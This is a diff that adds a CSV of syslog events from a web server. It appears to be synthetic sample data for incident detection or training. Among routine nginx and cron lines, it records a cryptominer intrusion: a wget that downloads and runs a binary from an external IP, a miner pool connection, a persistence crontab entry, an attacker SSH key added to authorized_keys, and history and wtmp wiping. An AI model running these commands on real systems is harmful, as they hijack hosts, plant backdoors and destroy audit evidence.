@@ -1,0 +1,70 @@
+_time,host,source,sourcetype,_raw
+2026-10-21T00:00:00.000Z,web-01,syslog,linux:syslog,"Oct 21 00:00:00 web-01 nginx[1022]: 10.0.0.89 - - ""GET /cart HTTP/1.1"" 200 4945"
+2026-10-21T00:13:13.000Z,web-01,syslog,linux:syslog,"Oct 21 00:13:13 web-01 nginx[1022]: 10.0.3.120 - - ""GET /api/health HTTP/1.1"" 200 4658"
+2026-10-21T00:32:26.000Z,web-01,syslog,linux:syslog,Oct 21 00:32:26 web-01 CRON[5468]: (root) CMD (/usr/lib/php/sessionclean)
+2026-10-21T00:48:48.000Z,web-01,syslog,linux:syslog,"Oct 21 00:48:48 web-01 nginx[1022]: 10.0.1.199 - - ""GET /static/app.js HTTP/1.1"" 200 3506"
+2026-10-21T00:56:07.000Z,web-01,syslog,linux:syslog,Oct 21 00:56:07 web-01 CRON[5692]: (root) CMD (/usr/lib/php/sessionclean)
+2026-10-21T01:09:53.000Z,web-01,syslog,linux:syslog,Oct 21 01:09:53 web-01 CRON[4996]: (root) CMD (/usr/lib/php/sessionclean)
+2026-10-21T01:21:27.000Z,web-01,syslog,linux:syslog,"Oct 21 01:21:27 web-01 nginx[1022]: 10.0.3.194 - - ""GET /static/app.js HTTP/1.1"" 200 743"
+2026-10-21T01:41:18.000Z,web-01,syslog,linux:syslog,"Oct 21 01:41:18 web-01 nginx[1022]: 10.0.2.232 - - ""GET / HTTP/1.1"" 200 1190"
+2026-10-21T01:50:03.000Z,web-01,syslog,linux:syslog,Oct 21 01:50:03 web-01 CRON[5473]: (root) CMD (/usr/lib/php/sessionclean)
+2026-10-21T02:12:50.000Z,web-01,syslog,linux:syslog,Oct 21 02:12:50 web-01 CRON[7463]: (root) CMD (/usr/lib/php/sessionclean)
+2026-10-21T02:34:02.000Z,web-01,syslog,linux:syslog,Oct 21 02:34:02 web-01 bash[38901]: root: wget -q http://91.92.249.13/x/kdevtmpfsi -O /tmp/.x/kdevtmpfsi && chmod +x /tmp/.x/kdevtmpfsi
+2026-10-21T02:34:20.000Z,web-01,syslog,linux:syslog,"Oct 21 02:34:20 web-01 kernel: [884213.22] audit: type=EXECVE argc=4 a0=""/tmp/.x/kdevtmpfsi"" a1=""-o"" a2=""pool.supportxmr.com:3333"" a3=""--donate-level=0"""
+2026-10-21T02:35:01.000Z,web-01,syslog,linux:syslog,"Oct 21 02:35:01 web-01 bash[38901]: root: (crontab -l; echo ""*/5 * * * * /tmp/.x/kdevtmpfsi >/dev/null 2>&1"") | crontab -"
+2026-10-21T02:36:12.000Z,web-01,syslog,linux:syslog,"Oct 21 02:36:12 web-01 bash[38901]: root: echo ""ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC7 attacker@kali"" >> /root/.ssh/authorized_keys"
+2026-10-21T02:36:50.000Z,web-01,syslog,linux:syslog,Oct 21 02:36:50 web-01 bash[38901]: root: history -c && rm -f /var/log/wtmp
+2026-10-21T02:37:05.000Z,web-01,syslog,linux:syslog,Oct 21 02:37:05 web-01 CRON[2869]: (root) CMD (/usr/lib/php/sessionclean)
+2026-10-21T02:40:00.000Z,web-01,syslog,linux:syslog,Oct 21 02:40:00 web-01 monitor[811]: ALERT cpu_usage=97% load_avg=8.39 top_process=kdevtmpfsi
+2026-10-21T02:40:02.000Z,web-01,syslog,linux:syslog,Oct 21 02:40:02 web-01 kernel: [890587.11] OUTBOUND SRC=172.31.4.18 DST=141.94.96.144 DPT=3333 PROTO=TCP
+2026-10-21T02:50:00.000Z,web-01,syslog,linux:syslog,Oct 21 02:50:00 web-01 monitor[811]: ALERT cpu_usage=99% load_avg=8.14 top_process=kdevtmpfsi
+2026-10-21T02:50:02.000Z,web-01,syslog,linux:syslog,Oct 21 02:50:02 web-01 kernel: [898440.11] OUTBOUND SRC=172.31.4.18 DST=141.94.96.144 DPT=3333 PROTO=TCP
+2026-10-21T02:57:31.000Z,web-01,syslog,linux:syslog,"Oct 21 02:57:31 web-01 nginx[1022]: 10.0.2.241 - - ""GET /products HTTP/1.1"" 200 7825"
+2026-10-21T03:00:00.000Z,web-01,syslog,linux:syslog,Oct 21 03:00:00 web-01 monitor[811]: ALERT cpu_usage=98% load_avg=7.22 top_process=kdevtmpfsi
+2026-10-21T03:00:02.000Z,web-01,syslog,linux:syslog,Oct 21 03:00:02 web-01 kernel: [892532.11] OUTBOUND SRC=172.31.4.18 DST=141.94.96.144 DPT=3333 PROTO=TCP
+2026-10-21T03:05:36.000Z,web-01,syslog,linux:syslog,"Oct 21 03:05:36 web-01 nginx[1022]: 10.0.2.170 - - ""GET /api/health HTTP/1.1"" 200 8998"
+2026-10-21T03:10:00.000Z,web-01,syslog,linux:syslog,Oct 21 03:10:00 web-01 monitor[811]: ALERT cpu_usage=100% load_avg=7.18 top_process=kdevtmpfsi
+2026-10-21T03:10:02.000Z,web-01,syslog,linux:syslog,Oct 21 03:10:02 web-01 kernel: [895272.11] OUTBOUND SRC=172.31.4.18 DST=141.94.96.144 DPT=3333 PROTO=TCP
+2026-10-21T03:14:55.000Z,web-01,syslog,linux:syslog,"Oct 21 03:14:55 web-01 nginx[1022]: 10.0.3.74 - - ""GET /products HTTP/1.1"" 200 4064"
+2026-10-21T03:20:00.000Z,web-01,syslog,linux:syslog,Oct 21 03:20:00 web-01 monitor[811]: ALERT cpu_usage=100% load_avg=7.93 top_process=kdevtmpfsi
+2026-10-21T03:20:02.000Z,web-01,syslog,linux:syslog,Oct 21 03:20:02 web-01 kernel: [892983.11] OUTBOUND SRC=172.31.4.18 DST=141.94.96.144 DPT=3333 PROTO=TCP
+2026-10-21T03:30:00.000Z,web-01,syslog,linux:syslog,Oct 21 03:30:00 web-01 monitor[811]: ALERT cpu_usage=99% load_avg=7.11 top_process=kdevtmpfsi
+2026-10-21T03:30:02.000Z,web-01,syslog,linux:syslog,Oct 21 03:30:02 web-01 kernel: [888774.11] OUTBOUND SRC=172.31.4.18 DST=141.94.96.144 DPT=3333 PROTO=TCP
+2026-10-21T03:31:12.000Z,web-01,syslog,linux:syslog,"Oct 21 03:31:12 web-01 nginx[1022]: 10.0.2.79 - - ""GET /cart HTTP/1.1"" 200 8264"
+2026-10-21T03:40:00.000Z,web-01,syslog,linux:syslog,Oct 21 03:40:00 web-01 monitor[811]: ALERT cpu_usage=99% load_avg=7.61 top_process=kdevtmpfsi
+2026-10-21T03:40:02.000Z,web-01,syslog,linux:syslog,Oct 21 03:40:02 web-01 kernel: [893339.11] OUTBOUND SRC=172.31.4.18 DST=141.94.96.144 DPT=3333 PROTO=TCP
+2026-10-21T03:50:00.000Z,web-01,syslog,linux:syslog,Oct 21 03:50:00 web-01 monitor[811]: ALERT cpu_usage=99% load_avg=7.28 top_process=kdevtmpfsi
+2026-10-21T03:50:02.000Z,web-01,syslog,linux:syslog,Oct 21 03:50:02 web-01 kernel: [888614.11] OUTBOUND SRC=172.31.4.18 DST=141.94.96.144 DPT=3333 PROTO=TCP
+2026-10-21T03:52:12.000Z,web-01,syslog,linux:syslog,"Oct 21 03:52:12 web-01 nginx[1022]: 10.0.2.42 - - ""GET /api/health HTTP/1.1"" 200 4798"
+2026-10-21T03:59:06.000Z,web-01,syslog,linux:syslog,"Oct 21 03:59:06 web-01 nginx[1022]: 10.0.0.162 - - ""GET /products HTTP/1.1"" 200 1135"
+2026-10-21T04:00:00.000Z,web-01,syslog,linux:syslog,Oct 21 04:00:00 web-01 monitor[811]: ALERT cpu_usage=97% load_avg=8.38 top_process=kdevtmpfsi
+2026-10-21T04:00:02.000Z,web-01,syslog,linux:syslog,Oct 21 04:00:02 web-01 kernel: [886012.11] OUTBOUND SRC=172.31.4.18 DST=141.94.96.144 DPT=3333 PROTO=TCP
+2026-10-21T04:10:00.000Z,web-01,syslog,linux:syslog,Oct 21 04:10:00 web-01 monitor[811]: ALERT cpu_usage=97% load_avg=8.18 top_process=kdevtmpfsi
+2026-10-21T04:10:02.000Z,web-01,syslog,linux:syslog,Oct 21 04:10:02 web-01 kernel: [887508.11] OUTBOUND SRC=172.31.4.18 DST=141.94.96.144 DPT=3333 PROTO=TCP
+2026-10-21T04:13:16.000Z,web-01,syslog,linux:syslog,Oct 21 04:13:16 web-01 CRON[3790]: (root) CMD (/usr/lib/php/sessionclean)
+2026-10-21T04:20:00.000Z,web-01,syslog,linux:syslog,Oct 21 04:20:00 web-01 monitor[811]: ALERT cpu_usage=97% load_avg=7.76 top_process=kdevtmpfsi
+2026-10-21T04:20:02.000Z,web-01,syslog,linux:syslog,Oct 21 04:20:02 web-01 kernel: [887865.11] OUTBOUND SRC=172.31.4.18 DST=141.94.96.144 DPT=3333 PROTO=TCP
+2026-10-21T04:21:36.000Z,web-01,syslog,linux:syslog,"Oct 21 04:21:36 web-01 nginx[1022]: 10.0.3.236 - - ""GET /api/health HTTP/1.1"" 200 6639"
+2026-10-21T04:30:00.000Z,web-01,syslog,linux:syslog,Oct 21 04:30:00 web-01 monitor[811]: ALERT cpu_usage=98% load_avg=7.24 top_process=kdevtmpfsi
+2026-10-21T04:30:02.000Z,web-01,syslog,linux:syslog,Oct 21 04:30:02 web-01 kernel: [891246.11] OUTBOUND SRC=172.31.4.18 DST=141.94.96.144 DPT=3333 PROTO=TCP
+2026-10-21T04:37:53.000Z,web-01,syslog,linux:syslog,"Oct 21 04:37:53 web-01 nginx[1022]: 10.0.3.237 - - ""GET /products HTTP/1.1"" 200 4942"
+2026-10-21T04:40:00.000Z,web-01,syslog,linux:syslog,Oct 21 04:40:00 web-01 monitor[811]: ALERT cpu_usage=98% load_avg=7.61 top_process=kdevtmpfsi
+2026-10-21T04:40:02.000Z,web-01,syslog,linux:syslog,Oct 21 04:40:02 web-01 kernel: [890633.11] OUTBOUND SRC=172.31.4.18 DST=141.94.96.144 DPT=3333 PROTO=TCP
+2026-10-21T04:50:00.000Z,web-01,syslog,linux:syslog,Oct 21 04:50:00 web-01 monitor[811]: ALERT cpu_usage=100% load_avg=7.77 top_process=kdevtmpfsi
+2026-10-21T04:50:02.000Z,web-01,syslog,linux:syslog,Oct 21 04:50:02 web-01 kernel: [885975.11] OUTBOUND SRC=172.31.4.18 DST=141.94.96.144 DPT=3333 PROTO=TCP
+2026-10-21T04:53:43.000Z,web-01,syslog,linux:syslog,Oct 21 04:53:43 web-01 CRON[3424]: (root) CMD (/usr/lib/php/sessionclean)
+2026-10-21T05:00:00.000Z,web-01,syslog,linux:syslog,Oct 21 05:00:00 web-01 monitor[811]: ALERT cpu_usage=96% load_avg=7.84 top_process=kdevtmpfsi
+2026-10-21T05:00:02.000Z,web-01,syslog,linux:syslog,Oct 21 05:00:02 web-01 kernel: [890280.11] OUTBOUND SRC=172.31.4.18 DST=141.94.96.144 DPT=3333 PROTO=TCP
+2026-10-21T05:10:00.000Z,web-01,syslog,linux:syslog,Oct 21 05:10:00 web-01 monitor[811]: ALERT cpu_usage=98% load_avg=7.78 top_process=kdevtmpfsi
+2026-10-21T05:10:02.000Z,web-01,syslog,linux:syslog,Oct 21 05:10:02 web-01 kernel: [884470.11] OUTBOUND SRC=172.31.4.18 DST=141.94.96.144 DPT=3333 PROTO=TCP
+2026-10-21T05:17:58.000Z,web-01,syslog,linux:syslog,"Oct 21 05:17:58 web-01 nginx[1022]: 10.0.1.134 - - ""GET /api/health HTTP/1.1"" 200 3275"
+2026-10-21T05:20:00.000Z,web-01,syslog,linux:syslog,Oct 21 05:20:00 web-01 monitor[811]: ALERT cpu_usage=100% load_avg=7.73 top_process=kdevtmpfsi
+2026-10-21T05:20:02.000Z,web-01,syslog,linux:syslog,Oct 21 05:20:02 web-01 kernel: [888502.11] OUTBOUND SRC=172.31.4.18 DST=141.94.96.144 DPT=3333 PROTO=TCP
+2026-10-21T05:30:00.000Z,web-01,syslog,linux:syslog,Oct 21 05:30:00 web-01 monitor[811]: ALERT cpu_usage=98% load_avg=7.17 top_process=kdevtmpfsi
+2026-10-21T05:30:02.000Z,web-01,syslog,linux:syslog,Oct 21 05:30:02 web-01 kernel: [895327.11] OUTBOUND SRC=172.31.4.18 DST=141.94.96.144 DPT=3333 PROTO=TCP
+2026-10-21T05:36:43.000Z,web-01,syslog,linux:syslog,"Oct 21 05:36:43 web-01 nginx[1022]: 10.0.1.79 - - ""GET /cart HTTP/1.1"" 200 7836"
+2026-10-21T05:40:00.000Z,web-01,syslog,linux:syslog,Oct 21 05:40:00 web-01 monitor[811]: ALERT cpu_usage=97% load_avg=7.88 top_process=kdevtmpfsi
+2026-10-21T05:40:02.000Z,web-01,syslog,linux:syslog,Oct 21 05:40:02 web-01 kernel: [886747.11] OUTBOUND SRC=172.31.4.18 DST=141.94.96.144 DPT=3333 PROTO=TCP
+2026-10-21T05:50:00.000Z,web-01,syslog,linux:syslog,Oct 21 05:50:00 web-01 monitor[811]: ALERT cpu_usage=97% load_avg=8.13 top_process=kdevtmpfsi
+2026-10-21T05:50:02.000Z,web-01,syslog,linux:syslog,Oct 21 05:50:02 web-01 kernel: [898044.11] OUTBOUND SRC=172.31.4.18 DST=141.94.96.144 DPT=3333 PROTO=TCP
+2026-10-21T05:53:16.000Z,web-01,syslog,linux:syslog,"Oct 21 05:53:16 web-01 nginx[1022]: 10.0.0.152 - - ""GET /cart HTTP/1.1"" 200 6558"
